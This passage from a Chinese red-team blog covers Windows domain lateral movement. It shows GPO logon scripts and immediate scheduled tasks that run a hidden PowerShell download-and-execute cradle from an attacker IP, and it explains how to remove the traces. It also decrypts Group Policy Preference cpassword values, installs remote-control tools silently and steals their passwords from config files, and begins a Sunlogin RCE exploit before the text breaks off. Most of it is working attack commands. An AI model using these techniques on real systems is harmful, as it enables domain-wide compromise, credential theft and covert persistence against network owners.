+<p><img src="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20220801183941078.png" alt="image-20220801183941078"></p>
+<p><strong>OU批量下发脚本</strong></p>
+<p>创建一个OU(GPOTEST),里面新建一个用户，gpo</p>
+<p><img src="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20220801151723320.png" alt="image-20220801151723320"></p>
+<p><code>gmc.msc</code>打开组策略管理，添加一个新的组策略(ADControl)</p>
+<p><img src="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20220801151819078.png" alt="image-20220801151819078"></p>
+<p>通过右键ADControl——编辑——用户配置——策略——windows设置——脚本——登录——<strong>显示文件</strong>——新建ADControl.bat</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd.exe &#x2F;c calc</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20220801151942558.png" alt="image-20220801151942558"></p>
+<p>然后将组策略管理器界面的GPOTEST链接到该组策略，右键链接到现有的GPO</p>
+<p><img src="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20220801152051552.png" alt="image-20220801152051552"></p>
+<p>此时，服务器跟客户端都要强制更新组策略</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gpupdate &#x2F;force</span><br></pre></td></tr></table></figure>
+
+<p>更新完成后，可以在客户端看到服务器下发的组策略,说明更新成功了</p>
+<p><img src="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20220801152317927.png" alt="image-20220801152317927"></p>
+<p>因为我们组策略规则设定了用户登录时会触发文件，因此需要重新登录一下，成功弹出计算器</p>
+<p><img src="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20220801152426090.png" alt="image-20220801152426090"></p>
+<h3 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h3><p><img src="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blogs/pictures/20210716180429.png" alt="20210716180429"></p>
+<p>这种方式能够按照时间定时的收集信息，相对来说比较隐蔽。</p>
+<p>这里演示下如何使用<code>New-GPOImmediateTask.ps1</code></p>
+<p>1.导入powershell中管理GPO的模块&amp;创建一个作用整个域的GPO</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Import-Module GroupPolicy –verbose</span><br><span class="line">new-gpo -name TestGPO | new-gplink -Target &quot;dc&#x3D;ns,dc&#x3D;com&quot;</span><br></pre></td></tr></table></figure>
+
+<p>2.执行脚本添加计划任务</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">New-GPOImmediateTask -TaskName Debugging -GPODisplayName TestGPO -SysPath &#39;\\dc\sysvol\ns.com&#39; Command &#39;powershell.exe&#39; -CommandArguments &#39;-nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#39;&#39;http:&#x2F;&#x2F;192.168.1.106:8022&#x2F;a&#39;&#39;))&quot;&#39;</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20200518105842-7b66f4b4-98b3-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200518105842-7b66f4b4-98b3-1.png" alt="img"></a></p>
+<p><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20200518105851-80b6db46-98b3-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200518105851-80b6db46-98b3-1.png" alt="img"></a></p>
+<p>3.强制更新组策略，或者默认等待90分钟等待组策略强制更新</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-GPUpdate -Computer &quot;redteam\USS&quot;</span><br></pre></td></tr></table></figure>
+
+<p>4.清理痕迹</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Remove-GPO -Name TestGPO</span><br></pre></td></tr></table></figure>
+
+<h3 id="GPP"><a href="#GPP" class="headerlink" title="GPP"></a>GPP</h3><p>组策略首选项(Group Policy Preference)</p>
+<p>原理：<a href="https://hackerqwq.github.io//2021/09/17/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E6%8F%90%E6%9D%83%E7%AF%87%E4%B8%89-Windows%E6%8F%90%E6%9D%83/#%E7%BB%84%E7%AD%96%E7%95%A5%E9%A6%96%E9%80%89%E9%A1%B9%E6%8F%90%E6%9D%83">https://hackerqwq.github.io//2021/09/17/渗透测试之提权篇三-Windows提权/#组策略首选项提权</a></p>
+<p>简要说明：当域控批量设置域内机器的密码时，会生成Groups.xml文件，里面包含密码，经过解密即可获得明文，从而批量上线</p>
+<p>直接搜索</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">for &#x2F;r \\dc&#x2F;sysvol %i in (*.vbs) do @echo %i</span><br><span class="line">for &#x2F;r \\dc&#x2F;sysvol %i in (*.bat) do @echo %i</span><br><span class="line">dir &#x2F;s &#x2F;a \\DC\SYSVOL\*.xml</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20220801184621835.png" alt="image-20220801184621835"></p>
+<p>继续查看，找到文件<code>Groups.xml</code>，路径为：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">\\DC\SYSVOL\ns.com\Policies\&#123;<span class="number">31</span>B2F340<span class="number">-016</span>D<span class="number">-11</span>D2<span class="number">-945</span>F<span class="number">-00</span>C04FB984F9&#125;\USER\Prefere</span><br><span class="line">nces\Groups\Groups</span><br></pre></td></tr></table></figure>
+
+<p>复制点击查看：</p>
+<p><img src="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20220801184712146.png" alt="image-20220801184712146"></p>
+<p>其中的关注点为<code>cpassword</code>:</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PP6ZyJT6tj+wErLmSjZzcw</span><br></pre></td></tr></table></figure>
+
+<p>复制</p>
+<p>此密码的加密方式为<code>AES-256</code>。尽管此加密十分难以破解，但是微软公司将其加密的密钥公开了。</p>
+<p>The 32-byte AES key is as follows:</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">4</span>e <span class="number">99</span> <span class="number">06</span> e8  fc b6 <span class="number">6</span>c c9  fa f4 <span class="number">93</span> <span class="number">10</span>  <span class="number">62</span> <span class="number">0</span>f fe e8</span><br><span class="line">f4 <span class="number">96</span> e8 <span class="number">06</span>  cc <span class="number">05</span> <span class="number">79</span> <span class="number">90</span>  <span class="number">20</span> <span class="number">9</span>b <span class="number">09</span> a4  <span class="number">33</span> b6 <span class="number">6</span>c <span class="number">1</span>b</span><br></pre></td></tr></table></figure>
+
+<p>复制</p>
+<p>地址：2.2.1.1.4 Password Encryption</p>
+<h4 id="密码破解方式"><a href="#密码破解方式" class="headerlink" title="密码破解方式"></a><strong>密码破解方式</strong></h4><h5 id="kali命令"><a href="#kali命令" class="headerlink" title="kali命令"></a><strong>kali命令</strong></h5><p>针对此密码，我们可以直接使用kali中自带的命令<code>gpp-decrypt</code>进行破解：</p>
+<p><img src="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20220801184819426.png"></p>
+<p>可以看到破解出的<code>abc123@</code></p>
+<h5 id="msf模块"><a href="#msf模块" class="headerlink" title="msf模块"></a><strong>msf模块</strong></h5><p>可使用msf后渗透模块<code>run post/windows/gather/credentials/gpp</code></p>
+<p>效果如下：</p>
+<p><img src="https://ask.qcloudimg.com/http-save/7220648/pdilj7g11g.png?imageView2/2/w/1620" alt="img"></p>
+<h5 id="PowerSploit"><a href="#PowerSploit" class="headerlink" title="PowerSploit"></a><strong>PowerSploit</strong></h5><p>工具地址：PowerSploit</p>
+<p>我们利用的是其中的<code>Get-GPPPassword</code>模块。</p>
+<blockquote>
+<p>检索通过组策略首选项推送的帐户的明文密码和其他信息。</p>
+</blockquote>
+<p>如下三种使用方法：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">powershell -executionpolicy bypass -file Get-GPPPassword.ps1</span><br><span class="line">Import-Module .\Get-GPPPassword.ps1;Get-GPPPassword</span><br><span class="line">powershell <span class="string">&quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-GPPPassword.ps1&#x27;);Get-GPPPassword&quot;</span>Import-Module .\Get-GPPPassword.ps1;Get-GPPPassword</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20220801185034901.png" alt="image-20220801185034901"></p>
+<h3 id="脚本利用"><a href="#脚本利用" class="headerlink" title="脚本利用"></a>脚本利用</h3><p>拿下域管权限后可能防火墙原因无法访问目标电脑，这时候可以利用组策略进行横向。</p>
+<p>通过组策略来下放恶意软件、创建/修改计划任务、降级凭据保护、向计算机添加新的帐户到本地管理员组、启用明文密码提取等。</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/FSecureLABS/SharpGPOAbuse">https://github.com/FSecureLABS/SharpGPOAbuse</a> 、<a target="_blank" rel="noopener" href="https://github.com/FuzzySecurity/StandIn">https://github.com/FuzzySecurity/StandIn</a> 实现计划任务、启动脚本、添加本地管理员用户。</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/Hackndo/pyGPOAbuse">https://github.com/Hackndo/pyGPOAbuse</a> 可以实现计划任务、添加本地管理员。</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/rootSySdk/PowerGPOAbuse">https://github.com/rootSySdk/PowerGPOAbuse</a> 可以实现的比较全。</p>
+<p><strong>powershell实现</strong></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#加载GroupPolicy模块 （win7没有，win10有）</span></span><br><span class="line"><span class="built_in">Import-Module</span> GroupPolicy</span><br><span class="line"><span class="comment">#创建一个GPO并将GPO链接到域test.local，需要域管权限。</span></span><br><span class="line"><span class="built_in">new-gpo</span> <span class="literal">-name</span> TestGPO | <span class="built_in">new-gplink</span> <span class="literal">-Target</span> <span class="string">&quot;dc=test,dc=local&quot;</span></span><br><span class="line"><span class="comment">#添加定时任务 --TargetDnsName指定计算机</span></span><br><span class="line">SharpGPOAbuse.exe -<span class="literal">-AddComputerTask</span> -<span class="literal">-TaskName</span> <span class="string">&quot;Update2&quot;</span> -<span class="literal">-Author</span> DOMAIN\Admin -<span class="literal">-Command</span> <span class="string">&quot;cmd.exe&quot;</span> -<span class="literal">-Arguments</span> <span class="string">&quot;/c calc.exe&quot;</span> -<span class="literal">-GPOName</span> <span class="string">&quot;TestGPO2&quot;</span> -<span class="literal">-FilterEnabled</span> -<span class="literal">-TargetDnsName</span> PC<span class="literal">-jack</span><span class="literal">-0day</span>.<span class="number">0</span>day.org</span><br><span class="line"><span class="comment">#删除GPO</span></span><br><span class="line"><span class="built_in">Remove-GPO</span> <span class="literal">-Name</span> TestGPO2</span><br></pre></td></tr></table></figure>
+
+<h1 id="远程登录"><a href="#远程登录" class="headerlink" title="远程登录"></a>远程登录</h1><h2 id="原生SMB"><a href="#原生SMB" class="headerlink" title="原生SMB"></a>原生SMB</h2><h3 id="简单命令"><a href="#简单命令" class="headerlink" title="简单命令"></a>简单命令</h3><p>适用于win机器</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net use \\DC.redteam.org</span><br><span class="line">dir \\redteam.org\c$</span><br></pre></td></tr></table></figure>
+
+<h3 id="smblient"><a href="#smblient" class="headerlink" title="smblient"></a>smblient</h3><p>smbclient在kali中内置，适用于搭建隧道本机访问的情况</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#列出目标机器共享的目录</span><br><span class="line">smbclient -L &#x2F;&#x2F;192.168.1.1</span><br><span class="line">#连接目标ip</span><br><span class="line">smbclient -N &#x2F;&#x2F;192.168.1.1&#x2F;c$ -U admin</span><br><span class="line">#上传文件(需要进入到文件夹下)</span><br><span class="line">put hello.txt</span><br><span class="line"># 下载文件</span><br><span class="line">get shell.exe</span><br></pre></td></tr></table></figure>
+
+<p>如果遇到</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Unable to connect with SMB1 -- no workgroup available</span><br></pre></td></tr></table></figure>
+
+<p>可以尝试在<code>/etc/samba/smb.conf</code>中的workgroup下添加</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">client min protocol &#x3D; NT1</span><br><span class="line">client max protocol &#x3D; SMB3</span><br></pre></td></tr></table></figure>
+
+<h3 id="smbexec"><a href="#smbexec" class="headerlink" title="smbexec"></a>smbexec</h3><p>用法：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\smbexec user:pass@ip</span><br></pre></td></tr></table></figure>
+
+<h2 id="PSExec"><a href="#PSExec" class="headerlink" title="PSExec"></a>PSExec</h2><p>当有其他机器权限的时候直接使用这条命令即可远程执行命令</p>
+<p>带上<code>-accepteula</code>参数可以防止弹窗</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">psexec.exe -accepteula \\192.168.93.224 cmd</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20211225203251660.png" alt="image-20211225203251660"></p>
+<h2 id="FTP"><a href="#FTP" class="headerlink" title="FTP"></a>FTP</h2><p>下载文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ftp&#x2F;&#x2F;运行命令ftp进入交互shell</span><br><span class="line">ftp&gt;open ip:port</span><br><span class="line">ftp&gt;username</span><br><span class="line">ftp&gt;password</span><br><span class="line">ftp&gt;get target.exe&#x2F;&#x2F;下载target.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20220725222911186.png" alt="image-20220725222911186"></p>
+<h2 id="GotoHTTP"><a href="#GotoHTTP" class="headerlink" title="GotoHTTP"></a>GotoHTTP</h2><p><strong>优点：</strong></p>
+<ul>
+<li>B2C模式，无<strong>需安装控制端软件</strong>，有浏览器就可以远控。</li>
+<li>流量走https协议，只要目标放行<strong>443</strong>端口出口就可以实现内网穿透。</li>
+<li>在低带宽也可以使用，运行占用内存极低，控制时占用CPU仅为0%-3%。</li>
+<li>被控端在类Linux系统上支持图形界面（GUI）和字符界面（CLI）。</li>
+</ul>
+<p><strong>缺点：</strong></p>
+<ul>
+<li>需要<strong>管理员权限</strong>运行</li>
+<li>一些行为（网络唤醒远程主机）需要加载驱动，<strong>导致运行时360安全卫士会拦截这行为</strong>，其他杀软则不会拦截。</li>
+</ul>
+<p>下载链接：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.gotohttp.com&#x2F;goto&#x2F;download.12x</span><br></pre></td></tr></table></figure>
+
+<p>将被控端放置在目标机器上,此处直接放上去运行，类比成webshell场景即可</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;GotoHTTP_x64.exe</span><br></pre></td></tr></table></figure>
+
+<p>可以看到此时会弹窗</p>
+<p><img src="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20220727204924999.png" alt="image-20220727204924999"></p>
+<p>读取gotohttp.ini文件获取电脑ID和控制码</p>
+<p><img src="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20220727205108036.png" alt="image-20220727205108036"></p>
+<p>在官网连接即可</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.gotohttp.com&#x2F;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20220727205224382.png" alt="image-20220727205224382"></p>
+<h2 id="Rustdesk"><a href="#Rustdesk" class="headerlink" title="Rustdesk"></a>Rustdesk</h2><p>优点：可以<strong>普通权限运行</strong>，并且支持纯内网环境</p>
+<p>官网：<a target="_blank" rel="noopener" href="https://rustdesk.com/zh/">https://rustdesk.com/zh/</a></p>
+<p>下载链接：<a target="_blank" rel="noopener" href="https://gitee.com/rustdesk/rustdesk/releases">https://gitee.com/rustdesk/rustdesk/releases</a></p>
+<p>下载portable免安装版本</p>
+<p><img src="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20220727210206392.png" alt="image-20220727210206392"></p>
+<p>在被控端和控制端放置rustdesk的exe</p>
+<p><strong>win7被控端</strong></p>
+<p><img src="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20220728102742920.png" alt="image-20220728102742920"></p>
+<p><strong>winserver2008控制端</strong></p>
+<p><img src="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20220728102815994.png" alt="image-20220728102815994"></p>
+<p>在被控端运行rustdesk.exe，此时会弹窗，所以需要确定目标机器没有人在操作的时候远程连接</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\rustdesk-1.1.9.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20220728102946582.png" alt="image-20220728102946582"></p>
+<p>查找配置文件，注意密码只有在桌面上将鼠标移到密码处时才会生成密码，因此我们可以直接在配置文件中自定义密码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\用户名\AppData\Roaming\RustDesk\config</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20220728103352342.png" alt="image-20220728103352342"></p>
+<p>同时需要开启ip直连，也可以修改默认连接端口,修改<strong>RustDesk2.toml</strong>文件(只需要修改被控端)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#开启IP直连</span><br><span class="line">direct-server&#x3D;&#39;Y&#39;</span><br><span class="line">#修改端口</span><br><span class="line">direct-access-port &#x3D; &#39;443&#39;</span><br></pre></td></tr></table></figure>
+
+<p>然后<strong>重启rustdesk.exe</strong>，输入IP端口连接即可</p>
+<p><img src="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20220728110458925.png" alt="image-20220728110458925"></p>
+<h2 id="Todesk"><a href="#Todesk" class="headerlink" title="Todesk"></a>Todesk</h2><p>优点：方便快捷</p>
+<p>缺点：需要联网</p>
+<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>ToDesk 是一款多平台<a target="_blank" rel="noopener" href="https://icode.best/go?go=aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTglQkYlOUMlRTclQTglOEIlRTYlOEUlQTclRTUlODglQjYvOTM0MzY4">远程控制</a>软件，支持主流操作系统Windows、Linux、Mac、Android、iOS跨平台协同操作。ToDesk支持任何网络环境下的远程实现，4.0版本已经开放100台设备列表。</p>
+<h3 id="安装命令"><a href="#安装命令" class="headerlink" title="安装命令"></a>安装命令</h3><p>静默安装</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ToDesk_Setup.exe /S</span><br></pre></td></tr></table></figure>
+
+<p>设置安全密码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">默认安装路径</span><br><span class="line">C:\Program Files (x86)\ToDesk\ToDesk.exe</span><br><span class="line"></span><br><span class="line">ToDesk.exe -setpasswd password</span><br><span class="line">eg:ToDesk.exe -setpasswd <span class="number">123456</span></span><br></pre></td></tr></table></figure>
+
+<p>查看运行状态</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">默认安装路径</span><br><span class="line">C:\Program Files (x86)\ToDesk\ToDesk.exe</span><br><span class="line"></span><br><span class="line">C:\Program Files (x86)\ToDesk\ToDesk.exe -status</span><br></pre></td></tr></table></figure>
+
+<h3 id="利用场景"><a href="#利用场景" class="headerlink" title="利用场景"></a>利用场景</h3><h4 id="未安装todesk"><a href="#未安装todesk" class="headerlink" title="未安装todesk"></a>未安装todesk</h4><p>在冰蝎webshell管理工具中上传todesk安装包<br><img src="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/071444321736b7090d2b78d5b6f17ffb.png" alt="071444321736b7090d2b78d5b6f17ffb"><br>静默安装(测试环境在cs的Administrator权限运行成功)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ToDesk_Setup.exe &#x2F;S</span><br></pre></td></tr></table></figure>
+
+<p>可以看到已经安装成功，但是依然会有弹窗（最好是管理员不在线情况下使用）<br><img src="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/bb9326a2c294234ab6fd15288a2db99b.png" alt="bb9326a2c294234ab6fd15288a2db99b"><br>获取密码方式<br>1.设置安全密码</p>
+<p>安全密码不是连接密码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ToDesk.exe -setpasswd 123456</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20220802180431241.png" alt="image-20220802180431241"></p>
+<p><strong>将ToDesk.exe重启，生成clientid</strong></p>
+<p>然后读取设备代码，即clientid，然后准备进行远程连接</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">type &quot;C:\Program Files (x86)\ToDesk\config.ini&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20220802180735170.png" alt="image-20220802180735170"></p>
+<p>2.读取临时密码<br>从config.ini中读取到tempAuthPassEx,替换到本机的config.ini，<strong>重启todesk</strong></p>
+<p><img src="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20220802181112565.png" alt="image-20220802181112565"></p>
+<p>获取到密码，远程连接</p>
+<p><img src="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20220802181211676.png" alt="image-20220802181211676"></p>
+<p>已经安装todesk的情况也是一样的，通过将目标机器的密码替换到本机就可以获得密码</p>
+<h4 id="获取历史连接记录"><a href="#获取历史连接记录" class="headerlink" title="获取历史连接记录"></a>获取历史连接记录</h4><p>ToDesk连接一台主机后会在默认安装目录下生成一个json格式文件，在已登录状态和未登录状态的文件命名方式不太一样。其中两种登陆状态的文件路径分别如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Program Files (x86)\ToDesk\devlist_******.json</span><br><span class="line">C:\Program Files (x86)\ToDesk\userInfo.json</span><br></pre></td></tr></table></figure>
+
+<p>这个文件主要用于存储历史连接记录，只需找到UserId（设备代码）和PassEx密码，然后利用配置文件覆盖的方式将PassEx解密得到密码明文，最后再用目标主机ToDesk的设备代码和密码连接。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">   <span class="string">&quot;DeviceInfo&quot;</span> : [</span><br><span class="line">      &#123;</span><br><span class="line">         <span class="string">&quot;Height&quot;</span> : <span class="number">723</span>,</span><br><span class="line">         <span class="string">&quot;LastPath&quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">         <span class="string">&quot;PassEx&quot;</span> : <span class="string">&quot;77075*******0ab54fee1e13935e5392771c24c418a6d526e3ab83ef578d215ebd87467876fd7f55312fb8dbbe9c478e35da8a3069a2&quot;</span>,</span><br><span class="line">         <span class="string">&quot;PrivacyScreen&quot;</span> : <span class="number">0</span>,</span><br><span class="line">         <span class="string">&quot;Quality&quot;</span> : <span class="number">0</span>,</span><br><span class="line">         <span class="string">&quot;ResolutionX&quot;</span> : <span class="number">0</span>,</span><br><span class="line">         <span class="string">&quot;ResolutionY&quot;</span> : <span class="number">0</span>,</span><br><span class="line">         <span class="string">&quot;ScreenMode&quot;</span> : <span class="number">0</span>,</span><br><span class="line">         <span class="string">&quot;UserId&quot;</span> : <span class="string">&quot;767***368&quot;</span>,</span><br><span class="line">         <span class="string">&quot;Voice&quot;</span> : <span class="number">0</span>,</span><br><span class="line">         <span class="string">&quot;Width&quot;</span> : <span class="number">1368</span></span><br><span class="line">      &#125;</span><br><span class="line">   ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="无法获取密码情况"><a href="#无法获取密码情况" class="headerlink" title="无法获取密码情况"></a>无法获取密码情况</h4><p>有时候不能设置安全密码，并且读取的出来的密码也不是正常的6位密码，我们可以直接kill todesk进程（先taskkill ToDesk_Service.exe所在进程）然后给目标机器修改config文件，替换成我们设置的密码，再重启todesk。</p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>todesk是在一些特殊的环境下进行使用，存在很多不足：<br>1.需要管理员权限<br>2.目标机器锁屏需要密码<br>3.体积太大<br>4.很容易被发现</p>
+<h2 id="向日葵"><a href="#向日葵" class="headerlink" title="向日葵"></a>向日葵</h2><h2 id="远程代码执行漏洞-CNVD-2022-10270-CNVD-2022-03672"><a href="#远程代码执行漏洞-CNVD-2022-10270-CNVD-2022-03672" class="headerlink" title="远程代码执行漏洞(CNVD-2022-10270/CNVD-2022-03672)"></a>远程代码执行漏洞(CNVD-2022-10270/CNVD-2022-03672)</h2><p><strong>漏洞简介</strong></p>
+<p>SunloginClient 启动后会在 <strong>40000</strong> 以上随机开放一个web端口，认证有问题可以直接通过<strong>cgi-bin/rpc?action=verify-haras</strong>获取<strong>cid</strong> 执行回显rce</p>
+<p><strong>影响版本：</strong></p>
+<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">向日葵个人版   Windows &lt;= <span class="number">11.0</span>.<span class="number">0.33</span></span><br><span class="line">向日葵简约版   &lt;= V1.<span class="number">0.1</span>.<span class="number">43315</span>（<span class="number">2021.12</span>）</span><br></pre></td></tr></table></figure>
+
+<p><strong>漏洞利用</strong></p>
+<p>安装漏洞版本向日葵，<a target="_blank" rel="noopener" href="https://github.com/Mr-xn/sunlogin_rce/blob/new/SunloginClient_11.0.0.33162_X64.exe">安装包</a></p>
+<ul>
+<li><p>手动测试</p>
+<p>nmap扫描</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 40000-65535 -T4 192.168.119.151</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20220821115342154.png" alt="image-20220821115342154"></p>
+<p>获取session</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;cgi-bin&#x2F;rpc?action&#x3D;verify-haras</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20220821114956127.png" alt="image-20220821114956127"></p>
+<p>Cookie添加CID</p>
